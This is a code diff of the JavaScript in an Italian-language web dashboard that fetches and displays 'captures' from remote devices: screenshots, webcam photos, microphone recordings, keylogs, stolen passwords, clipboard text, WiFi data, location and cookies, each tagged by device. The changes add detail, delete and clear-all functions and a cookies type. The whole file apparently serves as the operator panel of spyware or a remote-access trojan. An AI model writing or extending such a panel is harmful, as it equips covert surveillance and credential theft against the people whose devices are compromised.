@@ -151,49 +151,241 @@
     </div>
     <script src="/static/js/config.js"></script>
     <script>
-        let capturesData = [];
-        function toggleSidebar() { document.getElementById('sidebar').classList.toggle('open'); document.getElementById('sidebarOverlay').classList.toggle('active'); }
-        function refreshCaptures() {
-            const grid = document.getElementById('captureGrid');
-            grid.innerHTML = `<div style="grid-column:1/-1;text-align:center;padding:2rem;color:rgba(255,255,255,0.1);"><i class="fas fa-spinner fa-spin"></i> <span data-i18n="loading">Caricamento...</span></div>`;
-            fetch('/api/captures?limit=50').then(r=>r.json()).then(data=>{ capturesData=data; renderCaptures(data); document.getElementById('captureBadge').textContent=data.length; }).catch(()=>{
-                grid.innerHTML = `<div style="grid-column:1/-1;text-align:center;padding:2rem;color:rgba(255,255,255,0.1);"><i class="fas fa-exclamation-triangle"></i> <span data-i18n="no_captures">Nessuna cattura disponibile</span></div>`;
+    let capturesData = [];
+    let currentFilter = 'all';
+
+    function toggleSidebar() {
+        document.getElementById('sidebar').classList.toggle('open');
+        document.getElementById('sidebarOverlay').classList.toggle('active');
+    }
+
+    function refreshCaptures() {
+        const grid = document.getElementById('captureGrid');
+        grid.innerHTML = `<div style="grid-column:1/-1;text-align:center;padding:2rem;color:rgba(255,255,255,0.1);">
+            <i class="fas fa-spinner fa-spin"></i> <span data-i18n="loading">Caricamento...</span>
+        </div>`;
+
+        fetch('/api/captures?limit=50')
+            .then(res => res.json())
+            .then(data => {
+                capturesData = data;
+                renderCaptures(data);
+                document.getElementById('captureBadge').textContent = data.length;
+            })
+            .catch(() => {
+                grid.innerHTML = `<div style="grid-column:1/-1;text-align:center;padding:2rem;color:rgba(255,255,255,0.1);">
+                    <i class="fas fa-exclamation-triangle"></i> <span data-i18n="error">Errore di connessione</span>
+                </div>`;
+            });
+    }
+
+    function renderCaptures(captures) {
+        const grid = document.getElementById('captureGrid');
+        const filtered = applyFilters(captures);
+
+        if (!filtered || filtered.length === 0) {
+            grid.innerHTML = `<div style="grid-column:1/-1;text-align:center;padding:2rem;color:rgba(255,255,255,0.1);">
+                <i class="fas fa-inbox"></i> <span data-i18n="no_captures">Nessuna cattura trovata</span>
+            </div>`;
+            return;
+        }
+
+        const typeIcons = {
+            'screenshot': 'fa-desktop', 'webcam': 'fa-camera', 'mic': 'fa-microphone',
+            'keylog': 'fa-keyboard', 'passwords': 'fa-key', 'clipboard': 'fa-clipboard',
+            'wifi': 'fa-wifi', 'location': 'fa-map-pin', 'mouse': 'fa-mouse',
+            'files': 'fa-folder', 'cookies': 'fa-cookie'
+        };
+
+        const typeLabels = {
+            'screenshot': 'Screenshot', 'webcam': 'Webcam', 'mic': 'Microfono',
+            'keylog': 'Keylog', 'passwords': 'Password', 'clipboard': 'Clipboard',
+            'wifi': 'WiFi', 'location': 'Location', 'mouse': 'Mouse',
+            'files': 'Files', 'cookies': 'Cookies'
+        };
+
+        const typeColors = {
+            'screenshot': '#8b5cf6', 'webcam': '#22d3ee', 'mic': '#f472b6',
+            'keylog': '#f59e0b', 'passwords': '#ef4444', 'clipboard': '#34d399',
+            'wifi': '#60a5fa', 'location': '#f97316', 'mouse': '#a855f7',
+            'files': '#14b8a6', 'cookies': '#f43f5e'
+        };
+
+        let html = '';
+        filtered.forEach(c => {
+            const icon = typeIcons[c.type] || 'fa-file';
+            const label = typeLabels[c.type] || c.type;
+            const color = typeColors[c.type] || '#666';
+            const time = new Date(c.created_at).toLocaleString();
+            const device = c.device_id ? c.device_id.substring(0, 12) + '...' : 'Unknown';
+
+            let previewContent = '';
+            let dataPreview = '';
+
+            // Decodifica i dati
+            let dataObj = c.data;
+            if (typeof dataObj === 'string') {
+                try {
+                    dataObj = JSON.parse(dataObj);
+                } catch(e) {}
+            }
+
+            if ((c.type === 'screenshot' || c.type === 'webcam') && c.data) {
+                previewContent = `<img src="data:image/png;base64,${c.data}" alt="${label}" onclick="openPreview('data:image/png;base64,${c.data}')" style="cursor:pointer;width:100%;height:100%;object-fit:cover;" />`;
+            } else if (c.type === 'mic' && c.data) {
+                previewContent = `<audio controls style="width:100%;max-height:150px;padding:10px;"><source src="data:audio/wav;base64,${c.data}" type="audio/wav"></audio>`;
+            } else if (c.type === 'keylog' && dataObj) {
+                let keys = Array.isArray(dataObj) ? dataObj.map(k => k.key || k).join('') : dataObj;
+                if (typeof keys === 'string' && keys.length > 50) keys = keys.substring(0, 50) + '...';
+                dataPreview = `<div style="padding:0.5rem;font-size:0.8rem;color:#00ff88;word-break:break-all;font-family:monospace;max-height:150px;overflow-y:auto;background:rgba(0,0,0,0.3);border-radius:8px;">${keys}</div>`;
+                previewContent = `<div style="display:flex;align-items:center;justify-content:center;height:100%;font-size:2rem;opacity:0.3;">⌨️</div>`;
+            } else if ((c.type === 'passwords' || c.type === 'wifi' || c.type === 'contacts') && dataObj) {
+                let text = typeof dataObj === 'string' ? dataObj : JSON.stringify(dataObj, null, 2);
+                if (text.length > 200) text = text.substring(0, 200) + '...';
+                dataPreview = `<div style="padding:0.5rem;font-size:0.7rem;color:rgba(255,255,255,0.3);word-break:break-all;max-height:150px;overflow-y:auto;background:rgba(0,0,0,0.2);border-radius:8px;">${text}</div>`;
+                previewContent = `<div style="display:flex;align-items:center;justify-content:center;height:100%;font-size:2rem;opacity:0.3;"><i class="fas ${icon}"></i></div>`;
+            } else if (c.type === 'clipboard' && c.data) {
+                let text = typeof c.data === 'string' ? c.data : JSON.stringify(c.data);
+                if (text.length > 100) text = text.substring(0, 100) + '...';
+                dataPreview = `<div style="padding:0.5rem;font-size:0.7rem;color:rgba(255,255,255,0.3);word-break:break-all;max-height:150px;overflow-y:auto;background:rgba(0,0,0,0.2);border-radius:8px;">${text}</div>`;
+                previewContent = `<div style="display:flex;align-items:center;justify-content:center;height:100%;font-size:2rem;opacity:0.3;">📋</div>`;
+            } else {
+                previewContent = `<span class="placeholder"><i class="fas ${icon}" style="font-size:2rem;opacity:0.3;"></i></span>`;
+            }
+
+            html += `
+            <div class="capture-item" style="background:var(--bg-card,rgba(18,18,40,0.3));border:1px solid var(--border-color,rgba(255,255,255,0.04));border-radius:16px;overflow:hidden;transition:all 0.3s;">
+                <div class="preview" style="width:100%;height:180px;background:#0a0a1a;display:flex;align-items:center;justify-content:center;overflow:hidden;position:relative;">
+                    ${previewContent}
+                </div>
+                ${dataPreview ? `<div style="padding:0.3rem 1rem;background:rgba(0,0,0,0.2);border-bottom:1px solid rgba(255,255,255,0.03);">${dataPreview}</div>` : ''}
+                <div class="info" style="padding:0.8rem 1rem;">
+                    <div class="type" style="font-weight:600;font-size:0.8rem;color:${color};"><i class="fas ${icon}"></i> ${label}</div>
+                    <div class="meta" style="font-size:0.65rem;color:rgba(255,255,255,0.2);margin-top:0.2rem;">
+                        <span data-i18n="device">Device</span>: ${device} · ${time}
+                    </div>
+                    <div class="actions" style="margin-top:0.5rem;display:flex;gap:0.3rem;">
+                        <button class="btn-ghost" style="padding:0.2rem 0.5rem;font-size:0.6rem;" onclick="viewCapture(${c.id})">
+                            <i class="fas fa-info-circle"></i> <span data-i18n="details">Dettagli</span>
+                        </button>
+                        <button class="btn-ghost" style="padding:0.2rem 0.5rem;font-size:0.6rem;color:#ef4444;" onclick="deleteCapture(${c.id})">
+                            <i class="fas fa-trash"></i> <span data-i18n="delete">Elimina</span>
+                        </button>
+                    </div>
+                </div>
+            </div>`;
+        });
+        grid.innerHTML = html;
+    }
+
+    function applyFilters(captures) {
+        const data = captures || capturesData;
+        const type = document.getElementById('filterType').value;
+        if (type === 'all') return data;
+        return data.filter(c => c.type === type);
+    }
+
+    function viewCapture(id) {
+        fetch('/api/captures/' + id)
+            .then(res => res.json())
+            .then(data => {
+                if (data.error) {
+                    alert('❌ ' + data.error);
+                    return;
+                }
+                
+                let info = '📋 Dettagli Cattura\n\n';
+                info += 'ID: ' + data.id + '\n';
+                info += 'Tipo: ' + data.type + '\n';
+                info += 'Dispositivo: ' + (data.device_id || 'N/A') + '\n';
+                info += 'Data: ' + new Date(data.created_at).toLocaleString() + '\n\n';
+                
+                if (data.data) {
+                    let preview = typeof data.data === 'string' ? data.data : JSON.stringify(data.data, null, 2);
+                    if (preview.length > 500) preview = preview.substring(0, 500) + '...';
+                    info += '📄 Dati:\n' + preview;
+                }
+                
+                alert(info);
+            })
+            .catch(() => alert('❌ Errore caricamento dettagli'));
+    }
+
+    function deleteCapture(id) {
+        if (!id) {
+            alert('❌ ID cattura non valido');
+            return;
+        }
+        
+        if (confirm('⚠️ Eliminare questa cattura?')) {
+            fetch('/api/captures/' + id, {
+                method: 'DELETE',
+                headers: { 'Content-Type': 'application/json' }
+            })
+            .then(res => res.json())
+            .then(data => {
+                if (data.status === 'deleted') {
+                    alert('✅ Cattura eliminata!');
+                    refreshCaptures();
+                } else {
+                    alert('❌ ' + (data.error || 'Operazione fallita'));
+                }
+            })
+            .catch(err => {
+                console.error('Errore eliminazione:', err);
+                alert('❌ Errore: ' + err.message);
             });
         }
-        function renderCaptures(captures) {
-            const grid = document.getElementById('captureGrid');
-            const filtered = applyFilters(captures);
-            if (!filtered || filtered.length===0) { grid.innerHTML = `<div style="grid-column:1/-1;text-align:center;padding:2rem;color:rgba(255,255,255,0.1);"><i class="fas fa-inbox"></i> <span data-i18n="no_captures">Nessuna cattura trovata</span></div>`; return; }
-            const typeIcons = {'screenshot':'fa-desktop','webcam':'fa-camera','mic':'fa-microphone','keylog':'fa-keyboard','passwords':'fa-key','clipboard':'fa-clipboard','wifi':'fa-wifi','location':'fa-map-pin','mouse':'fa-mouse','files':'fa-folder'};
-            const typeLabels = {'screenshot':'Screenshot','webcam':'Webcam','mic':'Microfono','keylog':'Keylog','passwords':'Password','clipboard':'Clipboard','wifi':'WiFi','location':'Location','mouse':'Mouse','files':'Files'};
-            const typeColors = {'screenshot':'#8b5cf6','webcam':'#22d3ee','mic':'#f472b6','keylog':'#f59e0b','passwords':'#ef4444','clipboard':'#34d399','wifi':'#60a5fa','location':'#f97316','mouse':'#a855f7','files':'#14b8a6'};
-            let html = '';
-            filtered.forEach(c=>{
-                const icon = typeIcons[c.type] || 'fa-file';
-                const label = typeLabels[c.type] || c.type;
-                const color = typeColors[c.type] || '#666';
-                const time = new Date(c.created_at).toLocaleString();
-                const device = c.device_id ? c.device_id.substring(0,12) + '...' : 'Unknown';
-                let previewContent = '';
-                if ((c.type === 'screenshot' || c.type === 'webcam') && c.data) { previewContent = `<img src="data:image/png;base64,${c.data}" alt="${label}" onclick="openPreview('data:image/png;base64,${c.data}')" />`; }
-                else if (c.type === 'mic' && c.data) { previewContent = `<audio controls style="width:100%;max-height:150px;"><source src="data:audio/wav;base64,${c.data}" type="audio/wav"></audio>`; }
-                else if (c.data) { let text = typeof c.data === 'string' ? c.data : JSON.stringify(c.data, null, 2); previewContent = `<div style="padding:0.5rem;font-size:0.7rem;color:rgba(255,255,255,0.3);word-break:break-all;max-height:150px;overflow-y:auto;">${text.substring(0,200)}${text.length>200?'...':''}</div>`; }
-                else { previewContent = `<span class="placeholder"><i class="fas ${icon}" style="font-size:2rem;opacity:0.3;"></i></span>`; }
-                html += `<div class="capture-item"><div class="preview">${previewContent}</div><div class="info"><div class="type" style="color:${color};"><i class="fas ${icon}"></i> ${label}</div><div class="meta"><span data-i18n="device">Device</span>: ${device} · ${time}</div><div class="actions"><button class="btn-ghost" style="padding:0.2rem 0.5rem;font-size:0.6rem;" onclick="alert('<span data-i18n="details">Dettagli cattura</span>: ${c.id}')"><i class="fas fa-info-circle"></i></button><button class="btn-ghost" style="padding:0.2rem 0.5rem;font-size:0.6rem;color:#ef4444;" onclick="if(confirm('<span data-i18n="delete_confirm">Eliminare?</span>'))alert('<span data-i18n="deleted">Eliminato</span>')"><i class="fas fa-trash"></i></button></div></div></div>`;
+    }
+
+    function clearAllCaptures() {
+        if (confirm('⚠️ Eliminare TUTTE le catture? Questa operazione è irreversibile!')) {
+            fetch('/api/captures/clear', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' }
+            })
+            .then(res => res.json())
+            .then(data => {
+                if (data.status === 'cleared') {
+                    alert('✅ Tutte le catture eliminate!');
+                    refreshCaptures();
+                } else {
+                    alert('❌ ' + (data.error || 'Operazione fallita'));
+                }
+            })
+            .catch(err => {
+                console.error('Errore:', err);
+                alert('❌ Errore: ' + err.message);
             });
-            grid.innerHTML = html;
         }
-        function applyFilters(captures) {
-            const data = captures || capturesData;
-            const type = document.getElementById('filterType').value;
-            if (type === 'all') return data;
-            return data.filter(c => c.type === type);
-        }
-        function openPreview(src) { document.getElementById('previewImage').src = src; document.getElementById('previewModal').classList.add('active'); }
-        function closePreview() { document.getElementById('previewModal').classList.remove('active'); }
-        function updateTime() { document.getElementById('footerTime').textContent = new Date().toLocaleTimeString('it-IT'); }
-        fetch('/api/stats').then(r=>r.json()).then(data=>{ document.getElementById('deviceBadge').textContent=data.total_devices||0; document.getElementById('captureBadge').textContent=data.total_captures||0; });
-        refreshCaptures(); setInterval(refreshCaptures,30000); setInterval(updateTime,1000); updateTime();
-    </script>
+    }
+
+    function openPreview(src) {
+        document.getElementById('previewImage').src = src;
+        document.getElementById('previewModal').classList.add('active');
+    }
+
+    function closePreview() {
+        document.getElementById('previewModal').classList.remove('active');
+    }
+
+    function updateTime() {
+        document.getElementById('footerTime').textContent = new Date().toLocaleTimeString('it-IT');
+    }
+
+    // Carica badge
+    fetch('/api/stats')
+        .then(r => r.json())
+        .then(data => {
+            document.getElementById('deviceBadge').textContent = data.total_devices || 0;
+            document.getElementById('captureBadge').textContent = data.total_captures || 0;
+        });
+
+    // Avvia
+    refreshCaptures();
+    setInterval(refreshCaptures, 30000);
+    setInterval(updateTime, 1000);
+    updateTime();
+</script>
 </body>
 </html>
